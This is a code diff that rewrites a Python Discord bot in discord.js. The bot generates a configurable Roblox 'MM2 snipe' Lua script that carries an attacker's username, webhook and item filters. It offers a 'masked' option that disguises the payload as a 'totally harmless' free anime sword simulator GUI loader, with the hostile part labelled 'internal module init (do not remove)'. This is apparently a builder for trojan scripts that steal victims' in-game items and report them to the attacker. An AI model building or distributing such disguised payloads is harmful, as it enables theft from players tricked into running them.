@@ -1,185 +1,187 @@
-import nextcord
-from nextcord.ext import commands
-from nextcord import Interaction, SlashOption
-import aiohttp
-import asyncio
-import json
-import os
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits, AttachmentBuilder } = require('discord.js');
+const fs = require('fs');
+const https = require('https');
+const path = require('path');
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
+const TOKEN = process.env.BOT_TOKEN;
+const STATE_FILE = 'state.json';
+const CORE_FILE = 'core.lua';
 
-intents = nextcord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(intents=intents)
+// ── STATE ──────────────────────────────────────────────────────────────────────
+function loadState() {
+    if (fs.existsSync(STATE_FILE)) return JSON.parse(fs.readFileSync(STATE_FILE));
+    return { webhook: '', claimer: '', min_value: 0, min_rarity: 'None' };
+}
+function saveState(s) { fs.writeFileSync(STATE_FILE, JSON.stringify(s, null, 2)); }
+let state = loadState();
 
-STATE_FILE = "state.json"
+// ── CORE SCRIPT ────────────────────────────────────────────────────────────────
+function loadCore() {
+    if (fs.existsSync(CORE_FILE)) return fs.readFileSync(CORE_FILE, 'utf8');
+    return '-- core.lua not found';
+}
 
-def load_state() -> dict:
-    if os.path.exists(STATE_FILE):
-        with open(STATE_FILE, "r") as f:
-            return json.load(f)
-    return {"webhook": "", "claimer": "", "min_value": 0, "min_rarity": "None"}
-
-def save_state(state: dict):
-    with open(STATE_FILE, "w") as f:
-        json.dump(state, f, indent=2)
-
-state = load_state()
-
-MASK_WRAPPER = """-- {mask_name}
--- Free anime sword simulator GUI loader
--- Totally harmless, enjoy the game!
-
-local function loadGui()
-    print("Loading GUI...")
-end
-
+const MASK = `-- Anime Sword Simulator GUI v3.2
+-- Free GUI loader, totally harmless!
+local function loadGui() print("Loading GUI...") end
 loadGui()
-
 -- internal module init (do not remove)
-{payload}
-"""
+{payload}`;
 
-PAYLOAD_TEMPLATE = """_G.username = "{claimer}"
-_G.webhook  = "{webhook}"
-_G.minValue = {min_value}
-_G.minRarity = "{min_rarity}"
+function buildScript(masked) {
+    const core = loadCore();
+    const payload = `_G.username = "${state.claimer}"
+_G.webhook  = "${state.webhook}"
+_G.minValue = ${state.min_value}
+_G.minRarity = "${state.min_rarity}"
 _G.troller  = false
 
-{core_script}
-"""
+${core}`;
+    return masked ? MASK.replace('{payload}', payload) : payload;
+}
 
-def load_core_script() -> str:
-    if os.path.exists("core.lua"):
-        with open("core.lua", "r") as f:
-            return f.read()
-    return "-- core.lua not found"
+// ── WEBHOOK SEND ───────────────────────────────────────────────────────────────
+function sendWebhook(url, content) {
+    return new Promise((resolve) => {
+        const body = JSON.stringify({ username: 'MM2 Snipe Bot', content });
+        const u = new URL(url);
+        const req = https.request({ hostname: u.hostname, path: u.pathname + u.search, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } }, res => resolve(res.statusCode));
+        req.on('error', () => resolve(0));
+        req.write(body);
+        req.end();
+    });
+}
 
-async def send_to_webhook(webhook_url: str, content: str, username: str = "MM2 Snipe Bot"):
-    async with aiohttp.ClientSession() as session:
-        payload = {"username": username, "content": content}
-        async with session.post(webhook_url, json=payload) as resp:
-            return resp.status
+// ── CLIENT ─────────────────────────────────────────────────────────────────────
+const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
+// ── COMMANDS ───────────────────────────────────────────────────────────────────
+const commands = [
+    new SlashCommandBuilder()
+        .setName('setwebhook')
+        .setDescription('Set the Discord webhook URL for snipe logs')
+        .addStringOption(o => o.setName('url').setDescription('Full Discord webhook URL').setRequired(true)),
+    new SlashCommandBuilder()
+        .setName('setclaimer')
+        .setDescription('Set the claimer Roblox username')
+        .addStringOption(o => o.setName('username').setDescription('Your Roblox username').setRequired(true)),
+    new SlashCommandBuilder()
+        .setName('setfilters')
+        .setDescription('Set minimum value and rarity filters')
+        .addIntegerOption(o => o.setName('min_value').setDescription('Minimum item value').setRequired(true))
+        .addStringOption(o => o.setName('min_rarity').setDescription('Minimum rarity').setRequired(true)
+            .addChoices(
+                { name: 'None', value: 'None' },
+                { name: 'Common', value: 'Common' },
+                { name: 'Uncommon', value: 'Uncommon' },
+                { name: 'Rare', value: 'Rare' },
+                { name: 'Legendary', value: 'Legendary' },
+                { name: 'Godly', value: 'Godly' },
+                { name: 'Ancient', value: 'Ancient' },
+                { name: 'Chroma', value: 'Chroma' },
+                { name: 'Vintage', value: 'Vintage' },
+                { name: 'Unique', value: 'Unique' },
+                { name: 'Pet', value: 'Pet' },
+            )),
+    new SlashCommandBuilder()
+        .setName('status')
+        .setDescription('Show current bot configuration'),
+    new SlashCommandBuilder()
+        .setName('createchannel')
+        .setDescription('Create a new log channel with its own webhook')
+        .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
+        .addStringOption(o => o.setName('channel_name').setDescription('Name for the new channel').setRequired(true))
+        .addStringOption(o => o.setName('category_name').setDescription('Optional category name').setRequired(false)),
+    new SlashCommandBuilder()
+        .setName('getscript')
+        .setDescription('Generate the configured snipe script')
+        .addBooleanOption(o => o.setName('masked').setDescription('Wrap in decoy loader').setRequired(false)),
+    new SlashCommandBuilder()
+        .setName('testwebhook')
+        .setDescription('Send a test ping to the configured webhook'),
+].map(c => c.toJSON());
 
-@bot.slash_command(name="setwebhook", description="Set the Discord webhook URL for snipe logs")
-async def set_webhook(interaction: Interaction, url: str = SlashOption(description="Full Discord webhook URL")):
-    if not url.startswith("https://discord.com/api/webhooks/"):
-        await interaction.response.send_message("❌ Invalid webhook URL.", ephemeral=True)
-        return
-    state["webhook"] = url
-    save_state(state)
-    await interaction.response.send_message("✅ Webhook set.", ephemeral=True)
+// ── REGISTER ───────────────────────────────────────────────────────────────────
+client.once('ready', async () => {
+    console.log(`[+] Logged in as ${client.user.tag}`);
+    const rest = new REST({ version: '10' }).setToken(TOKEN);
+    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
+    console.log('[+] Slash commands registered');
+});
 
+// ── HANDLERS ───────────────────────────────────────────────────────────────────
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isChatInputCommand()) return;
+    const { commandName } = interaction;
 
-@bot.slash_command(name="setclaimer", description="Set the claimer Roblox username")
-async def set_claimer(interaction: Interaction, username: str = SlashOption(description="Your Roblox username")):
-    state["claimer"] = username
-    save_state(state)
-    await interaction.response.send_message(f"✅ Claimer set to `{username}`.", ephemeral=True)
+    if (commandName === 'setwebhook') {
+        const url = interaction.options.getString('url');
+        if (!url.startsWith('https://discord.com/api/webhooks/')) {
+            return interaction.reply({ content: '❌ Invalid webhook URL.', ephemeral: true });
+        }
+        state.webhook = url;
+        saveState(state);
+        return interaction.reply({ content: '✅ Webhook set.', ephemeral: true });
+    }
 
+    if (commandName === 'setclaimer') {
+        state.claimer = interaction.options.getString('username');
+        saveState(state);
+        return interaction.reply({ content: `✅ Claimer set to \`${state.claimer}\`.`, ephemeral: true });
+    }
 
-@bot.slash_command(name="setfilters", description="Set minimum value and rarity filters")
-async def set_filters(
-    interaction: Interaction,
-    min_value: int = SlashOption(description="Minimum item value"),
-    min_rarity: str = SlashOption(
-        description="Minimum rarity",
-        choices=["None","Common","Uncommon","Rare","Legendary","Godly","Ancient","Chroma","Vintage","Unique","Pet"]
-    )
-):
-    state["min_value"] = min_value
-    state["min_rarity"] = min_rarity
-    save_state(state)
-    await interaction.response.send_message(
-        f"✅ Filters — min value: `{min_value}` | min rarity: `{min_rarity}`", ephemeral=True
-    )
+    if (commandName === 'setfilters') {
+        state.min_value = interaction.options.getInteger('min_value');
+        state.min_rarity = interaction.options.getString('min_rarity');
+        saveState(state);
+        return interaction.reply({ content: `✅ Filters — min value: \`${state.min_value}\` | min rarity: \`${state.min_rarity}\``, ephemeral: true });
+    }
 
+    if (commandName === 'status') {
+        const embed = new EmbedBuilder()
+            .setTitle('MM2 Sniper Config')
+            .setColor(0xff6b35)
+            .addFields(
+                { name: 'Claimer',    value: `\`${state.claimer || 'not set'}\``, inline: true },
+                { name: 'Webhook',    value: `\`${state.webhook ? 'set' : 'not set'}\``, inline: true },
+                { name: 'Min Value',  value: `\`${state.min_value}\``, inline: true },
+                { name: 'Min Rarity', value: `\`${state.min_rarity}\``, inline: true },
+            );
+        return interaction.reply({ embeds: [embed], ephemeral: true });
+    }
 
-@bot.slash_command(name="status", description="Show current bot configuration")
-async def status(interaction: Interaction):
-    embed = nextcord.Embed(title="MM2 Sniper Config", color=0xff6b35)
-    embed.add_field(name="Claimer",    value=f"`{state['claimer'] or 'not set'}`",  inline=True)
-    embed.add_field(name="Webhook",    value=f"`{'set' if state['webhook'] else 'not set'}`", inline=True)
-    embed.add_field(name="Min Value",  value=f"`{state['min_value']}`",              inline=True)
-    embed.add_field(name="Min Rarity", value=f"`{state['min_rarity']}`",             inline=True)
-    await interaction.response.send_message(embed=embed, ephemeral=True)
+    if (commandName === 'createchannel') {
+        await interaction.deferReply({ ephemeral: true });
+        const channelName = interaction.options.getString('channel_name');
+        const categoryName = interaction.options.getString('category_name');
+        let category = null;
+        if (categoryName) {
+            category = interaction.guild.channels.cache.find(c => c.name === categoryName && c.type === 4);
+            if (!category) category = await interaction.guild.channels.create({ name: categoryName, type: 4 });
+        }
+        const channel = await interaction.guild.channels.create({ name: channelName, type: 0, parent: category?.id });
+        const wh = await channel.createWebhook({ name: 'MM2 Snipe Logs' });
+        return interaction.followUp({ content: `✅ Channel <#${channel.id}> created.\n🔗 Webhook: \`${wh.url}\`\n\nUse \`/setwebhook\` with this URL.`, ephemeral: true });
+    }
 
+    if (commandName === 'getscript') {
+        if (!state.claimer || !state.webhook) {
+            return interaction.reply({ content: '❌ Set claimer and webhook first.', ephemeral: true });
+        }
+        await interaction.deferReply({ ephemeral: true });
+        const masked = interaction.options.getBoolean('masked') ?? false;
+        const script = buildScript(masked);
+        const buf = Buffer.from(script, 'utf8');
+        const file = new AttachmentBuilder(buf, { name: 'script.lua' });
+        return interaction.followUp({ content: `${masked ? '🎭 Masked' : '📄 Raw'} script ready.`, files: [file], ephemeral: true });
+    }
 
-@bot.slash_command(name="createchannel", description="Create a new log channel with its own webhook")
-async def create_channel(
-    interaction: Interaction,
-    channel_name: str = SlashOption(description="Name for the new channel"),
-    category_name: str = SlashOption(description="Optional category name", required=False)
-):
-    guild = interaction.guild
-    if not guild:
-        await interaction.response.send_message("❌ Must be used in a server.", ephemeral=True)
-        return
+    if (commandName === 'testwebhook') {
+        if (!state.webhook) return interaction.reply({ content: '❌ No webhook set.', ephemeral: true });
+        await interaction.deferReply({ ephemeral: true });
+        const code = await sendWebhook(state.webhook, '✅ Webhook test from MM2 Sniper bot.');
+        return interaction.followUp({ content: `Webhook responded with HTTP \`${code}\`.`, ephemeral: true });
+    }
+});
 
-    await interaction.response.defer(ephemeral=True)
-
-    category = None
-    if category_name:
-        category = nextcord.utils.get(guild.categories, name=category_name)
-        if not category:
-            category = await guild.create_category(category_name)
-
-    channel = await guild.create_text_channel(channel_name, category=category)
-    wh = await channel.create_webhook(name="MM2 Snipe Logs")
-
-    await interaction.followup.send(
-        f"✅ Channel <#{channel.id}> created.\n🔗 Webhook: `{wh.url}`\n\nUse `/setwebhook` with this URL to point logs here.",
-        ephemeral=True
-    )
-
-
-@bot.slash_command(name="getscript", description="Generate the configured snipe script")
-async def get_script(
-    interaction: Interaction,
-    masked: bool = SlashOption(description="Wrap in an innocent-looking decoy loader", required=False, default=False)
-):
-    if not state["claimer"] or not state["webhook"]:
-        await interaction.response.send_message("❌ Set claimer and webhook first.", ephemeral=True)
-        return
-
-    await interaction.response.defer(ephemeral=True)
-
-    core = load_core_script()
-    payload = PAYLOAD_TEMPLATE.format(
-        claimer=state["claimer"],
-        webhook=state["webhook"],
-        min_value=state["min_value"],
-        min_rarity=state["min_rarity"],
-        core_script=core
-    )
-
-    output = MASK_WRAPPER.format(mask_name="Anime Sword Simulator GUI v3.2", payload=payload) if masked else payload
-
-    fname = "script.lua"
-    with open(fname, "w") as f:
-        f.write(output)
-
-    await interaction.followup.send(
-        f"{'🎭 Masked' if masked else '📄 Raw'} script ready.",
-        file=nextcord.File(fname, filename="script.lua"),
-        ephemeral=True
-    )
-    os.remove(fname)
-
-
-@bot.slash_command(name="testwebhook", description="Send a test ping to the configured webhook")
-async def test_webhook(interaction: Interaction):
-    if not state["webhook"]:
-        await interaction.response.send_message("❌ No webhook set.", ephemeral=True)
-        return
-    await interaction.response.defer(ephemeral=True)
-    code = await send_to_webhook(state["webhook"], "✅ Webhook test from MM2 Sniper bot.")
-    await interaction.followup.send(f"Webhook responded with HTTP `{code}`.", ephemeral=True)
-
-
-@bot.event
-async def on_ready():
-    print(f"[+] Logged in as {bot.user} | Ready")
-
-bot.run(BOT_TOKEN)
+client.login(TOKEN);
